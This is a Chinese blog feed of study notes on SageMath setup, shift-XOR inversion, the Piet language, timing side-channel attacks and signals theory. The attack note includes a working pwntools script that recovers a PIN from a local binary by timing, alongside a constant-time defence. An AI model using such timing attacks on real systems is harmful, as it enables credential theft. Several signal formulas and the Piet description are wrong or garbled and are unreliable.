<figcaption aria-hidden="true">Sage Assets</figcaption>
</figure>
<figure>
<img src="/sagemath-get-started/Sage%20Setup.png" alt="Sage Setup">
<figcaption aria-hidden="true">Sage Setup</figcaption>
</figure>
<p>安装过程中特别注意 <code>home directory</code> 的选择，这将决定 Sage
Shell 的初始工作目录：</p>
<figure>
<img src="/sagemath-get-started/sagehome.png" alt="sagehome">
<figcaption aria-hidden="true">sagehome</figcaption>
</figure>
<p>还有 <code>Destination Location</code> 即安装目录：</p>
<figure>
<img src="/sagemath-get-started/sagedestination.png" alt="sagedestination">
<figcaption aria-hidden="true">sagedestination</figcaption>
</figure>
<p>其他选项可以按默认配置进行。</p>
<h1 id="sagemath-使用">Sagemath 使用</h1>
<p>现在在 Sage <code>home directory</code> 目录下编写一个
<code>.sage</code> 脚本：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">&quot;hello world&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>我们打开 <code>SageMath 9.3 Shell</code>，输入 <code>ls</code>
可以查看到我们刚刚编写的脚本文件：</p>
<figure>
<img src="/sagemath-get-started/Sage%20Shell%20-%20ls.png" alt="Sage Shell - ls">
<figcaption aria-hidden="true">Sage Shell - ls</figcaption>
</figure>
<p>使用指令 <code>sage hello.sage</code> 尝试运行我们的脚本：</p>
<figure>
<img src="/sagemath-get-started/Sage%20Shell%20-%20helloworld.png" alt="Sage Shell - helloworld">
<figcaption aria-hidden="true">Sage Shell - helloworld</figcaption>
</figure>
<p>成功运行即可！</p>
<p>同时我们也可以使用另一种方式运行我们的脚本：交互式 Shell</p>
<p>我们运行
<code>SageMath 9.3</code>，第一次运行可能加载较慢，如下图所示：</p>
<figure>
<img src="/sagemath-get-started/Sage%20Console.png" alt="Sage Console">
<figcaption aria-hidden="true">Sage Console</figcaption>
</figure>
<p>其是基于 iPython 而定制的交互式 Shell，我们可以使用 Sage 内置函数
<code>load(filepath)</code> 来运行我们的脚本：</p>
<figure>
<img src="/sagemath-get-started/Sage%20Console%20-%20load.png" alt="Sage Console - load">
<figcaption aria-hidden="true">Sage Console - load</figcaption>
</figure>
<p>如果对于一些运算量较大的脚本，我们可以使用 Sagecell
在线运行我们的脚本得到结果：</p>
<p><a href="https://sagecell.sagemath.org/">https://sagecell.sagemath.org/</a></p>
<h1 id="sage-windows-python3.7">Sage-windows &amp; Python3.7</h1>
<p>Sage-windows 实际上是基于 Cygwin 运行的 Python3.7 脚本。</p>
<p>想要使用 Python3.7 的其他包，我们需要手动使用 <code>pip3</code>
进行安装，但这里提供一个更加快捷的方式：找到本地的 Python3
根目录，将根目录下的 <code>Lib\site-packages</code> 文件夹复制后粘贴到
Sage 根目录下的 <code>runtime\lib\python3.7\site-packages</code></p>
<p>这样相当于快速重新安装一遍已有的 Python
库，但推荐更稳妥的方式还是自己手动重新安装一遍所需要的库 (一般 Sage
已经安装了绝大多数需要使用到的库了)。</p>
<p>然后我们再在 <code>SageMath 9.3 Console</code> 中运行以下脚本：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pkg_resources</span><br><span class="line"><span class="keyword">from</span> subprocess <span class="keyword">import</span> call</span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> packages <span class="keyword">in</span> [dist.project_name <span class="keyword">for</span> dist <span class="keyword">in</span> pkg_resources.working_set]:</span><br><span class="line">    call(<span class="string">&quot;pip3 install --upgrade &quot;</span> + <span class="string">&#x27;&#x27;</span>.join(packages), shell=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>
<p>以便快速更新所有脚本。</p>
<h2 id="sagemath-console">SageMath Console</h2>
<p><code>SageMath Console</code> 可以认为是 Sagemath 的一个交互式
iPython。</p>
<h2 id="sagemath-shell">SageMath Shell</h2>
<p><code>SageMath Shell</code> 可以认为是基于 Windows 的 Cygwin
运行的一个终端，内置了许多有用的软件。</p>
<h2 id="sagemath-notebook">SageMath Notebook</h2>
<p><code>SageMath Notebook</code> 是一个基于 <strong>jupyter</strong>
的交互式 web 终端，打开后会开启一个本地 web 服务器方便使用 Sage。</p>
<p>具体的使用可以参考文章：<a href="https://zhuanlan.zhihu.com/p/297736314">https://zhuanlan.zhihu.com/p/297736314</a></p>
<h1 id="sagemath-更多">SageMath 更多</h1>
<p>更多有关 SageMath 的知识可以<a href="/tags/sagemath/">点击此处</a>查看本博客其他有关 SageMath
的文章。</p>
]]></content>
      <tags>
        <tag>note</tag>
        <tag>sagemath</tag>
      </tags>
  </entry>
  <entry>
    <title></title>
    <url>/post/scaffold.html</url>
    <content><![CDATA[<h1 id="title">Title</h1>
]]></content>
  </entry>
  <entry>
    <title>自异或性质笔记</title>
    <url>//self-xor-note.html</url>
    <content><![CDATA[<h1 id="自异或简述">自异或简述</h1>
<p>自异或指的是一系列数值本身与自身进行异或的算法，例如存在 <span class="math display">\[
A\oplus A=0
\]</span> 也算是一种算法。</p>
<p>但本文只讨论一些需要推理过程的自异或<strong>逆算法</strong>。</p>
<h2 id="自位移异或">自位移异或</h2>
<p>自位移异或指的是形如 <span class="math display">\[
A\oplus (A&gt;&gt;bit)
\]</span> 的算法。</p>
<p>简单起见，我们观察一个 8 位二进制数，右移 3 位后异或的过程。</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">value<span class="punctuation">:</span>    <span class="number">1101</span> <span class="number">0010</span></span><br><span class="line">shifted<span class="punctuation">:</span>  <span class="number">0001</span> <span class="number">1010</span> # <span class="number">010</span> (&gt;&gt; <span class="number">3</span>)</span><br><span class="line">result<span class="punctuation">:</span>   <span class="number">1100</span> <span class="number">1000</span></span><br></pre></td></tr></table></figure>
<p>首先，观察到 <code>result</code> 的最高 <code>shift</code> 位与
<code>value</code> 的最高 <code>shift</code> 位是一样的。因此，在
<code>result</code> 的基础上，我们可以将其与一个二进制遮罩取与，得到
<code>value</code> 的最高 <code>shift</code>
位。这个遮罩应该是：<code>1111 1111 &lt;&lt; (8 - 3) = 1110 0000</code>。于是我们得到
<code>1100 0000</code>。</p>
<p>其次，注意到对于异或运算有如下事实：<code>a ^ b ^ b = a</code>。依靠二进制遮罩，我们已经获得了
<code>value</code> 的最高 <code>shift</code> 位。因此，我们也就能得到
<code>shifted</code> 的最高 <code>2 * shift</code> 位。它应该是
<code>1100 0000 &gt;&gt; 3 = 0001 1000</code>。将其与
<code>result</code> 取异或，则能得到 <code>value</code> 的最高
<code>2 * shift</code> 位。于是我们得到 <code>1101 0000</code>。</p>
<p>我们很容易可以发现，最多只需要进行这样的操作两次即可<strong>还原</strong>原本的值。</p>
<p>我们同样对其他位数的二进制数进行取样，可以很容易发现，操作次数与位数的关系是：
<span class="math display">\[
times=bits/shift
\]</span>
同理，对于左位移异或也是一样的，但是需要注意的是，一般来说左位移异或会给予一个<strong>掩码值</strong>确保左异或不会越界，所以写出完整的自位移异或逆算法如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">unshiftRight</span>(<span class="params">x: <span class="built_in">int</span>, shift: <span class="built_in">int</span>, mask: <span class="built_in">int</span> = <span class="literal">None</span>, bits: <span class="built_in">int</span> = <span class="number">32</span></span>):</span><br><span class="line">    <span class="keyword">if</span> mask <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        mask = (<span class="number">1</span> &lt;&lt; bits) - <span class="number">1</span></span><br><span class="line">    res = x</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(bits // shift):</span><br><span class="line">        res = x ^ res &gt;&gt; shift &amp; mask</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">unshiftLeft</span>(<span class="params">x: <span class="built_in">int</span>, shift: <span class="built_in">int</span>, mask: <span class="built_in">int</span> = <span class="literal">None</span>, bits: <span class="built_in">int</span> = <span class="number">32</span></span>):</span><br><span class="line">    <span class="keyword">if</span> mask <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        mask = (<span class="number">1</span> &lt;&lt; bits) - <span class="number">1</span></span><br><span class="line">    res = x</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(bits // shift):</span><br><span class="line">        res = x ^ res &lt;&lt; shift &amp; mask</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line">value = <span class="number">0b11010010</span></span><br><span class="line">shift = <span class="number">3</span></span><br><span class="line">result = <span class="number">0b11001000</span></span><br><span class="line"><span class="built_in">print</span>(result == value ^ value &gt;&gt; shift, value == unshiftRight(result, shift, bits=<span class="number">8</span>))</span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>misc</tag>
      </tags>
  </entry>
  <entry>
    <title>piet 编程语言笔记</title>
    <url>//piet-note.html</url>
    <content><![CDATA[<h1 id="piet-语言简述">Piet 语言简述</h1>
<p>Piet 是一种非常深奥的编程语言，使用颜色编写代码。由David
Morgan-Mar，其方案是位图，看起来像抽象艺术设计。编译指导图像周围移动，从一个连续颜色的区域下的一个“指针”。通过一个地区的指针退出时的程序进行。</p>
<h1 id="piet-语言编程">Piet 语言编程</h1>
<p>我们可以使用 https://gabriellesc.github.io/piet/ 编写 Piet</p>
<h1 id="piet-语言运行">Piet 语言运行</h1>
<p>Piet 拥有解释器和编译器，其中</p>
<ul>
<li><p>Windows 平台解释器</p>
<p>使用 Mike Tolly 所编写的 npiet，下载链接如下：</p>
<p>https://www.bertnase.de/npiet/npiet-1.3a-win32.zip</p>
<p>有关 npiet 的简介跟用法可以查看：</p>
<p>https://www.bertnase.de/npiet</p>
<p>或是使用命令</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npiet.exe -h</span><br></pre></td></tr></table></figure></li>
<li><p>Linux 平台解释器</p>
<p>https://github.com/JensBouman/Piet_interpreter</p>
<p>该解释器带有使用 <code>tkinter</code> 库编写的 GUI</p>
<p>用 git 克隆或通过 github 下载源码后，直接运行 <code>main.py</code>
即可</p>
<p>但该解释器编写于 python3，且依赖
<code>pillow</code>、<code>numpy</code> 和 <code>pygubu</code>
库，可以使用以下指令进行安装</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pip3 install pillow</span><br><span class="line">pip3 install numpy</span><br><span class="line">pip3 install pygubu</span><br></pre></td></tr></table></figure>
<p>可以使用以下命令了解用法：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 ./main.py -h</span><br></pre></td></tr></table></figure></li>
<li><p>全平台翻译器</p>
<p>https://github.com/boothby/repiet</p>
<p>该翻译器可以将 piet 语言的 PNG、GIF 图片翻译为 C、C++、Python、piet
和 repiet 语言 (如果不指定会默认翻译为 Python)</p>
<p>该翻译器使用 python3，可以直接使用以下指令获取</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pip3 install repiet</span><br></pre></td></tr></table></figure>
<p>更多用法可查看 github 主页和使用以下命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">repiet.exe -h</span><br></pre></td></tr></table></figure></li>
</ul>
]]></content>
      <tags>
        <tag>note</tag>
        <tag>piet</tag>
      </tags>
  </entry>
  <entry>
    <title>侧信道攻击笔记</title>
    <url>//side-channel-attack-note.html</url>
    <content><![CDATA[<h1 id="侧信道攻击">侧信道攻击</h1>
<h2 id="简述">简述</h2>
<p>侧信道攻击是基于从计算机系统中获得的信息的任何攻击，而不是算法本身的弱点（例如密码分析和软件错误）。时间信息、功耗、电磁泄漏甚至是声音都可以提供额外的信息来源，可以加以利用。</p>
<p>Web 2.0应用程序和软件即服务（SaaS）的兴起显著增加了 Web
侧信道攻击的可能性，即使 Web
浏览器和服务器之间的传输是加密的，比如说盲注攻击。</p>
<p>侧信道攻击一般类别包括：</p>
<ul>
<li>缓存攻击 →
攻击基于攻击者监控受害者在共享物理系统（如在虚拟化环境或某种云服务中）进行的缓存访问的能力。</li>
<li>定时攻击 →
基于测量各种计算（例如，将攻击者的给定密码与受害者的未知密码进行比较）执行的时间的攻击。</li>
<li>电源监控攻击 → 在计算过程中利用硬件不同功耗的攻击。</li>
<li>电磁攻击 →
基于泄露的电磁辐射的攻击，可以直接提供明文等信息。此类测量可用于使用与功率分析中的技术等效的技术来推断密码密钥，或者可用于非密码攻击。</li>
<li>声学密码分析 →
利用计算过程中产生的声音的攻击（类似于功率分析）。</li>
<li>差分故障分析 → 通过在计算中引入故障来发现秘密。</li>
<li>数据残留 → 敏感数据在被删除后被读取。</li>
<li>软件发起的故障攻击 →
目前是一种罕见的侧通道，Row_hammer是一个示例</li>
<li>光学 →
可以使用高分辨率相机或其他具有此类功能的设备，通过视觉记录来读取机密和敏感数据。</li>
</ul>
<p>在所有情况下，基本原则是由密码系统（在侧面）的操作引起的物理效应可以提供有关系统中秘密的有用的额外信息，例如，密码密钥、部分状态信息、完整或部分明文和等等。</p>
<h2 id="定时攻击">定时攻击</h2>
<h3 id="简述-1">简述</h3>
<p>在定时攻击中，攻击者试图通过分析执行密码算法所花费的时间来破坏密码系统。因为计算机中的每个逻辑操作都需要时间来执行，并且时间可能因输入而异，所以通过精确测量每个操作的时间，攻击者可以回溯到输入。通过时间信息发现秘密可能比使用已知明文、密文对的密码分析要容易得多。有时，时序信息与密码分析相结合，以增加信息泄漏率。</p>
<p>例如模幂运算中使用的平方和乘法算法的执行时间线性地取决于密钥中“1”位的数量。虽然“1”位的数量不足以使找到密钥变得容易，但使用相同的密钥和不同的输入重复执行可用于执行时序信息的统计相关性分析以完全恢复密钥，即使通过被动攻击者。</p>
<p>但是需要注意到的是，观察到的时序测量通常包括噪声（来自诸如网络延迟、访问与访问之间的磁盘驱动器访问差异以及用于从传输错误中恢复的纠错技术等来源）。</p>
<p>当然，定时攻击对许多加密算法是实用的，包括 RSA、ElGamal
和数字签名算法。</p>
<h3 id="实例">实例</h3>
<p>假设我们有一个程序，有一个简单的不安全的密码验证函数：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">bool</span> <span class="title">insecureStringCompare</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* a, <span class="type">const</span> <span class="type">char</span>* b, <span class="type">size_t</span> length)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; length; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (a[i] != b[i])</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>程序需要输入一个 8 位数字 PIN，当输入长度不为 8 时，程序会提示
<code>length error</code>。</p>
<p>这个时候我们可以用定时攻击，脚本如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pwn</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run</span>(<span class="params">PIN</span>):</span><br><span class="line">    io = pwn.process(<span class="string">&quot;./pin_checker&quot;</span>)</span><br><span class="line">    io.recvall()</span><br><span class="line">    start = time.time()</span><br><span class="line">    io.sendline(PIN.encode())</span><br><span class="line">    io.recvall()</span><br><span class="line">    end = time.time()</span><br><span class="line">    io.close()</span><br><span class="line">    <span class="keyword">return</span> end - start</span><br><span class="line"></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    t = []</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">        ret = run(result + <span class="built_in">str</span>(j) + <span class="string">&quot;0&quot;</span> * (<span class="number">7</span> - i))</span><br><span class="line">        t.append(ret)</span><br><span class="line">    result += <span class="built_in">str</span>(t.index(<span class="built_in">max</span>(t)))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;PIN: <span class="subst">&#123;result&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>通过对每个密码运行时间的不同，我们便可以不通过密码分析得到 PIN。</p>
<p>同时如果需要对定时攻击进行防御，我们可以将比较函数稍稍修改：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">bool</span> <span class="title">constantTimeStringCompare</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* a, <span class="type">const</span> <span class="type">char</span>* b, <span class="type">size_t</span> length)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">int</span> result = <span class="number">1</span>;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; length; i++)</span><br><span class="line">		result &amp;= a[i] == b[i];</span><br><span class="line">	<span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这个密码比较函数在时间上是安全的。</p>
]]></content>
      <tags>
        <tag>note</tag>
      </tags>
  </entry>
  <entry>
    <title>信号与系统笔记</title>
    <url>//signal-and-system-note1.html</url>
    <content><![CDATA[<h1 id="信号与系统">信号与系统</h1>
<h2 id="简介">简介</h2>
<h3 id="信号的分类">信号的分类</h3>
<h4 id="确定性信号与随机性信号">确定性信号与随机性信号</h4>
<ul>
<li>确定性信号（规则信号）：信号可以被表示为一个<strong>确定的时间函数</strong>
<span class="math inline">\(f(t)\)</span>，但确定性信号也代表着我们没办法获得任何新的信息，因为它的<strong>未来是既定的</strong>。</li>
<li>随机性信号：某一时刻的信号是无法确定的，或者称作<strong>未来是不确定的</strong>，这代表着它可以传递新的信息。</li>
</ul>
<h4 id="周期信号与非周期信号">周期信号与非周期信号</h4>
<p>一个<strong>确定性信号</strong>又被分为周期信号与非周期信号，因为这将帮助我们简化研究。</p>
<ul>
<li>周期信号：即时间函数存在周期，写作 <span class="math inline">\(f(t)=f(t+nT),n\in Z\)</span>，例如 <span class="math inline">\(f(t)=\sin{t}\)</span> 是典型的正弦信号。</li>
<li>非周期信号：一般为了方便研究，通常会将非周期信号当作 <span class="math inline">\(T\to \infty\)</span> 的一个周期信号。</li>
</ul>
<h4 id="连续时间信号与离散时间信号">连续时间信号与离散时间信号</h4>
<ul>
<li>连续时间信号：除了<strong>有限个</strong>间断点以外的在任意时刻都有确切函数值的信号称作连续信号。</li>
<li>离散时间信号：时间上是离散的，只在某些不连续的瞬时点上存在函数值，其他时间上没有定的信号称作离散信号。</li>
</ul>
<blockquote>
<p>需要注意的是，连续信号并非是连续函数，仅仅是区别于离散信号之称。</p>
<p>一般情况下，用 <span class="math inline">\(t\)</span>
表示连续时间变量；用 <span class="math inline">\(n\)</span>
表示离散时间变量</p>
</blockquote>
<figure>
<img src="/signal-and-system-note1/连续时间信号与离散时间信号示例.jpg" alt="连续时间信号与离散时间信号示例">
<figcaption aria-hidden="true">连续时间信号与离散时间信号示例</figcaption>
</figure>
<h4 id="一维信号与多维信号">一维信号与多维信号</h4>
<p>由于确定性信号是一个确定的函数表达式，所以可以被分为单变量函数和多变量函数。</p>
<ul>
<li>一维信号：单变量函数，例如语音信号中声压随时间变化的函数。</li>
<li>多维信号：多变量函数，例如图像信号中光强与坐标的函数。</li>
</ul>
<h4 id="模拟信号抽样信号与数字信号">模拟信号，抽样信号与数字信号</h4>
<ul>
<li>模拟信号：一般是真实世界中的连续信号，例如语音信号</li>
<li>抽样信号：时间是离散的，但幅值是连续的（有无限个幅值），一般是通过抽样函数抽样后得到的信号</li>
<li>数字信号：一般是方便传输和计算机运算的信号，时间和幅值均是离散的（幅值为有限个，例如普通单片机中的数字信号仅有
<span class="math inline">\(0\)</span> 和 <span class="math inline">\(5\symbf{V}\)</span>）</li>
</ul>
<figure>
<img src="/signal-and-system-note1/模拟信号和抽样信号和数字信号示例.png" alt="模拟信号和抽样信号和数字信号示例">
<figcaption aria-hidden="true">模拟信号和抽样信号和数字信号示例</figcaption>
</figure>
<h3 id="典型确定性信号">典型确定性信号</h3>
<p>为方便研究，一般我们仅考虑信号中 <span class="math inline">\(t\geq
0\)</span> 的部分。</p>
<h4 id="指数信号">指数信号</h4>
<p>指数信号的表达式为 <span class="math display">\[
f(t)=Ke^{at}
\]</span> 其中 <span class="math inline">\(a\)</span>
为实数，由函数特性可知：</p>
<ul>
<li>当 <span class="math inline">\(a&gt;0\)</span>
时，信号将随时间增长；</li>
<li>当 <span class="math inline">\(a&lt;0\)</span>
时，信号将随时间衰减；</li>
<li>当 <span class="math inline">\(a=0\)</span>
时，信号将不随时间变化，退化为 <span class="math inline">\(f(t)=K\)</span>，即直流信号。</li>
</ul>
<p>常数 <span class="math inline">\(K\)</span>
表示指数信号的<strong>初始状态</strong>（即 <span class="math inline">\(t=0\)</span> 时的初始值）。</p>
<figure>
<img src="/signal-and-system-note1/指数信号波形.png" alt="指数信号波形">
<figcaption aria-hidden="true">指数信号波形</figcaption>
</figure>
<p>由于 <span class="math inline">\(a\)</span>
的绝对值的大小反映了信号增长或衰减的速率（快慢），故通常记 <span class="math display">\[
\tau=\frac{1}{|a|}
\]</span>
称作<strong>时间常数</strong>，这个值越大<strong>代表指数信号增长或衰减的速率越慢</strong>。</p>
<p>现实生活中通常遇到的是衰减指数信号（如负反馈系统中特别常见），记作
<span class="math display">\[
f(t)=\begin{cases}
Ke^{-\frac{t}{\tau}} &amp; t\geq 0\\
0 &amp; t&lt;0
\end{cases}
\]</span></p>
<blockquote>
<p>主要是喜欢它对时间的微分和积分仍是指数信号的性质。</p>
</blockquote>
<h4 id="正弦信号">正弦信号</h4>
<p>正弦信号与余弦信号不作区分（由于仅相差 <span class="math inline">\(\frac{\pi}{2}\)</span>
个相位），仅讨论正弦信号，表达式为 <span class="math display">\[
f(t)=K\sin{(\omega t+\theta)}
\]</span> 其中 <span class="math inline">\(K\)</span>
为<strong>振幅</strong>，<span class="math inline">\(\omega\)</span>
为<strong>角频率</strong>，<span class="math inline">\(\theta\)</span>
为<strong>初相位</strong>。</p>
<figure>
<img src="/signal-and-system-note1/正弦信号.png" alt="正弦信号">
<figcaption aria-hidden="true">正弦信号</figcaption>
</figure>
<p>正弦信号是周期信号，满足 <span class="math display">\[
T=\frac{2\pi}{\omega}=\frac{1}{f}
\]</span> 其中，<span class="math inline">\(f\)</span>
为<strong>频率</strong>，表示正弦信号震荡的快慢。</p>
<p>实际的正弦震荡信号可能按指数规律衰减，一般乘以指数信号表达，其表达式为
<span class="math display">\[
f(t)=\begin{cases}
Ke^{-\frac{t}{\tau}}\sin{(\omega t+\theta)} &amp; t\geq 0\\
0 &amp; t&lt;0
\end{cases}
\]</span> <img src="/signal-and-system-note1/衰减的正弦信号.png" alt="衰减的正弦信号"></p>
<p>同时需要注意的是，在复分析中会使用复指数信号表示正弦信号，即 <span class="math display">\[
\newcommand{\j}{\mathrm{j}}
\sin{(\omega t)}=\frac{1}{2\j}(e^{\j\omega t}-e^{-\j\omega t})\\
\cos{(\omega t)}=\frac{1}{2}(e^{\j\omega t}+e^{-\j\omega t})
\]</span></p>
<blockquote>
<p>同样的，正弦信号的微分和积分结果是同频率的正弦信号</p>
</blockquote>
<h4 id="复指数信号">复指数信号</h4>
<p>复指数信号的表达式为 <span class="math display">\[
f(t)=Ke^{st}
\]</span> 其中 <span class="math display">\[
s=\sigma+\j\omega
\]</span> 借助欧拉公式可以展开复指数信号： <span class="math display">\[
Ke^{st}=Ke^{\sigma t}\cos{(\omega t)}+\j Ke^{\sigma t}\sin{(\omega t)}
\]</span>
即复指数信号由两部分信号组成：实部的余弦信号，虚部的正弦信号。</p>
<p>其中 <span class="math inline">\(\sigma\)</span>
表示了振幅随时间变化的快慢，且</p>
<ul>
<li><p>当 <span class="math inline">\(\sigma &gt;0\)</span>
时，正弦信号和余弦信号是<strong>增幅振荡</strong>；</p></li>
<li><p>当 <span class="math inline">\(\sigma &lt;0\)</span>
时，正弦信号和余弦信号是<strong>衰减振荡</strong>；</p></li>
<li><p>当 <span class="math inline">\(\sigma =0\)</span>
时，正弦信号和余弦信号是<strong>等幅振荡</strong>。</p></li>
<li><p>当 <span class="math inline">\(\sigma=0,\omega=0\)</span>，即
<span class="math inline">\(s=0\)</span> 时，此时退化为直流信号，即
<span class="math inline">\(f(t)=K\)</span>。</p></li>
</ul>
<p>一般用作简化分析。</p>
<h4 id="抽样信号newcommandsamathopmathrmsasat">抽样信号（<span class="math inline">\(\newcommand{\Sa}{\mathop{\mathrm{Sa}}}\Sa{(t)}\)</span>）</h4>
<p>抽样信号一般记作 <span class="math inline">\(\Sa(t)\)</span>，表达式为 <span class="math display">\[
\Sa{(t)}=\frac{\sin{t}}{t}
\]</span> 可以知道其为偶函数，图像如下</p>
<figure>
<img src="/signal-and-system-note1/抽样信号图像.png" alt="抽样信号图像">
<figcaption aria-hidden="true">抽样信号图像</figcaption>
</figure>
<p>其中可以证明得到如下性质 <span class="math display">\[
\newcommand{\diff}{\mathrm{d}}
\begin{align}
\lim_{t\to 0}\Sa{(t)}&amp;=1\\
\lim_{t\to \infty}\Sa{(t)}&amp;=0\\
\int^{\infty}_0\Sa{(t)}\diff{t}&amp;=\frac{\pi}{2}\\
\int^{\infty}_{\infty}\Sa{(t)}\diff{t}&amp;=\pi
\end{align}
\]</span> 与 <span class="math inline">\(\Sa(t)\)</span> 相似的有 <span class="math display">\[
\newcommand{\sinc}{\mathop{\mathrm{sinc}}}
\sinc{t}=\frac{\sin{\pi t}}{\pi t}
\]</span></p>
<p>需要注意的是， <span class="math display">\[
\Sa{(\frac{n}{2}\pi)}=
\begin{cases}
\pm1,n=2k+1\\
\delta(t),n=2k
\end{cases}
\]</span></p>
<blockquote>
<p>有些书中，也把两种符号混用。</p>
</blockquote>
<blockquote>
<p>由于现实中无法创造真正的冲激函数，而创造 <span class="math inline">\(\Sa{(t)}\)</span>
却是容易的，故我们可以使得其频率特别大而接近于冲激函数以便采样。</p>
</blockquote>
<h4 id="钟形信号高斯函数">钟形信号（高斯函数）</h4>
<p>钟形信号的表达式为 <span class="math display">\[
f(t)=Ee^{-(\frac{t}{\tau})^2}
\]</span> <img src="/signal-and-system-note1/钟形信号示例.png" alt="钟形信号示例"></p>
<p>可以得知 <span class="math display">\[
f(\frac{\tau}{2})=Ee^{-\frac{1}{4}}\approx 0.78E
\]</span> 即 <span class="math inline">\(\tau\)</span> 为信号从 <span class="math inline">\(E\)</span> 衰减到 <span class="math inline">\(0.78E\)</span>
时所占据的时间宽度，也称作<strong>带宽</strong>。</p>
<blockquote>
<p>钟形信号在随机信号分析中占重要地位。</p>
</blockquote>
<h3 id="信号的运算">信号的运算</h3>
<h4 id="移位">移位</h4>
<p>数学表达式为 <span class="math inline">\(f(t)\to
f(t-t_0)\)</span>，其中 <span class="math inline">\(t_0\)</span>
为信号位移量。</p>
<figure>
<img src="/signal-and-system-note1/信号的位移.png" alt="信号的位移">
<figcaption aria-hidden="true">信号的位移</figcaption>
</figure>
<ul>
<li>当 <span class="math inline">\(t_0&gt;0\)</span>
时，信号向右位移，又称信号<strong>滞后</strong>；</li>
<li>当 <span class="math inline">\(t_0&lt;0\)</span>
时，信号向左位移，又称信号<strong>超前</strong>；</li>
</ul>
<p>比如说同一个波源发射的波信号通过同一种介质传播在不同位置的波信号相对于波源处的波信号就会出现滞后现象，这与传播的时间差（或波程）有关系。</p>
<h4 id="反褶">反褶</h4>
<p>数学表达式为 <span class="math inline">\(f(t)\to
f(-t)\)</span>，即信号的<strong>未来与过去发生了交换</strong>。</p>
<figure>
<img src="/signal-and-system-note1/信号的反褶.png" alt="信号的反褶">
<figcaption aria-hidden="true">信号的反褶</figcaption>
</figure>
<p>实际物理元器件无法做到反褶，仅能在数字处理中做到相应的概念。</p>
<h4 id="尺度变换">尺度变换</h4>
<p>尺度变换又称作尺度倍乘，数学表达式为 <span class="math inline">\(f(t)\to f(at)\)</span>，其中 <span class="math inline">\(a\)</span> 为尺度。</p>
<ul>
<li>当 <span class="math inline">\(a&gt;1\)</span>
时，信号将被<strong>压缩</strong>，即保持信号的时间缩短了；</li>
<li>当 <span class="math inline">\(a&lt;1\)</span>
时，信号将被<strong>扩展</strong>，即保持信号的时间增长了。</li>
</ul>
<figure>
<img src="/signal-and-system-note1/信号的尺度变换.png" alt="信号的尺度变换">
<figcaption aria-hidden="true">信号的尺度变换</figcaption>
</figure>
<h4 id="微分">微分</h4>
<p>即信号对时间 <span class="math inline">\(t\)</span> 求导数： <span class="math display">\[
f&#39;(t)=\frac{\diff}{\diff{t}}f(t)
\]</span></p>
<blockquote>
<p>在实际物理元器件中，可以使用电感电路求电信号的微分。</p>
</blockquote>
<p>可见微分可以突出信号的变化部分。</p>
<blockquote>
<p>如果是黑白图像信号，那么微分运算可以突出它的边缘轮廓，这也是图像处理中常用的手法。</p>
</blockquote>
<figure>
<img src="/signal-and-system-note1/微分运算.png" alt="微分运算">
<figcaption aria-hidden="true">微分运算</figcaption>
</figure>
<blockquote>
<p>需要注意的是，如果对阶跃信号求微分将得到冲激信号。</p>
</blockquote>
<h4 id="积分">积分</h4>
<p>即信号对时间 <span class="math inline">\(t\)</span> 求积分： <span class="math display">\[
\int^t_{-\infty}f(\tau)\diff{\tau}
\]</span></p>
<blockquote>
<p>在实际物理元器件中，可以使用电容电路求电信号的积分。</p>
</blockquote>
<p>可见微分可以使得信号的变化部分变得平滑。</p>
<blockquote>
